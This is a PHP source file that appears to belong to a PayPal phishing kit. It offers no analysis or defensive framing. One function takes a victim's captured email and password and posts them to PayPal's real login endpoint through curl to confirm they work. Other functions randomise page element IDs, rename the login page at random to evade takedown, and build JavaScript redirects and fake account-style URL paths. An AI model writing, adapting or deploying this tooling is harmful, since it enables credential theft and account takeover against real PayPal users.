<?php
//---------------------------------------------------------------------------------------- ECD
	session_start();
	error_reporting(0);
	set_time_limit(0);
	header('Content-type: text/html; charset-UTF-8');
//---------------------------------------------------------------------------------------- DDT
	date_default_timezone_set('GMT');
//---------------------------------------------------------------------------------------- SRP
	function _9lab_69($r9, $rj, $sf){
	return str_replace($r9, $rj, $sf); 
	}
//---------------------------------------------------------------------------------------- CRL
	function Anon_http($srv, $usr, $url, $pstf, $pst, $cks, $rtf, $vrb, $flw, $hdr){
	$ci = curl_init();
	curl_setopt_array($ci, array(
	CURLOPT_TIMEOUT => 0,
	CURLOPT_SSL_VERIFYPEER => $srv,
	CURLOPT_USERAGENT => $usr,
	CURLOPT_URL => $url,
	CURLOPT_POSTFIELDS => $pstf,
	CURLOPT_POST => $pst,
	CURLOPT_COOKIESESSION => $cks,
	CURLOPT_COOKIEJAR =>  dirname(__FILE__).'/1.txt',
	CURLOPT_COOKIEFILE => dirname(__FILE__).'/1.txt',
	CURLOPT_RETURNTRANSFER => $rtf,
	CURLOPT_VERBOSE => $vrb,
	CURLOPT_FOLLOWLOCATION => $flw,
	CURLOPT_HEADER => $hdr
	));
	return curl_exec($ci);
	curl_close($ci);
	}
//---------------------------------------------------------------------------------------- JNF
	function X(){
	$caracteres = "ABCDEFGHIJKLMNOPQRSTUVWXYZ-abcdefghijklmnopqrstuvwxyz";
	$desordenada = str_shuffle($caracteres);
	return substr($desordenada, 1, rand(4,13));
	}
	function Y(){
	return X();
	}
//---------------------------------------------------------------------------------------- TRU
	function Anon_true($lawl, $tani, $bnadm){
	$ck = 'https://www.paypal-prepaid.com/account/authenticatePP.m';
	$ac = 'https://www.paypal.com/webapps/auth/loginauth?execution=e1s1';
	$in = "execution=e1s1&phonePinLogin=false";
	$in .= "&email=$lawl&password=$tani";
	$in .= "&_eventId_submit=Log+In&RMC=&flow_name=&fso_enabled=22";
 	$tr = Anon_http(0, $bnadm, $ck, 0, 0, 1, 1, 0, 1, 0);
 	$tr = Anon_http(0, $bnadm, $ac, $in, 1, 0, 1, 0, 1, 0);
	return (preg_match('/name="password"/i', $tr)) ? false : true;
	}
//---------------------------------------------------------------------------------------- ERO
	function Ghalat_Assi($error, $tarjama){
	if(isset($error) || $error == 'false'){
	return "<div id=\"wteurcb\" class=\"footer-sec\">
	<div   id=\" ".Y()." \"   class=\"error-assat\">
	<div   id=\" ".Y()." \"   class=\"lisar\"><img src=\"./lib/img/error.png\"></div>
	<div class=\"liman\" > ".$tarjama." </div>
	</div>";
	}
	}
//---------------------------------------------------------------------------------------- RDR
	function Hna_lhih($fin, $tkhrbi9, $blad){
	return "<html><head>
	<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1252\"> 
	<script language=\"javascript\"> 
	var sir9wd = \"./$fin$tkhrbi9$blad\"           
	top.location = sir9wd; 
	</script>  
	</head> 
	</html>\n";
	}
//---------------------------------------------------------------------------------------- RNM
	$login = array("authen.php", "sign-in.php", "signin.php", "login.php", "secure.php");
	function Badal_smiya(){
	global $login;
	$login_jdid = $login[array_rand($login)];
	foreach ($login  as $kyn_login) {
	if (file_exists($kyn_login)) {
	return rename($kyn_login,$login_jdid);
	}
	}
	}
//---------------------------------------------------------------------------------------- BDL	
	function Jib_milaf(){
	global $login;
	foreach ($login  as $dkhol_index) {
	if (file_exists($dkhol_index)) {
	return $dkhol_index.'?';
	}
	}
	}
//---------------------------------------------------------------------------------------- RNM
	$randzab = array("authen-token/", "iduser=", "accessid=", "id=",
	"manage-account/", "case-number=", "access-user/", "confirm-id/");
	function Rand_bill(){
	global $randzab;
	return $randzab[array_rand($randzab)];
	}
//---------------------------------------------------------------------------------------- FIN

?>
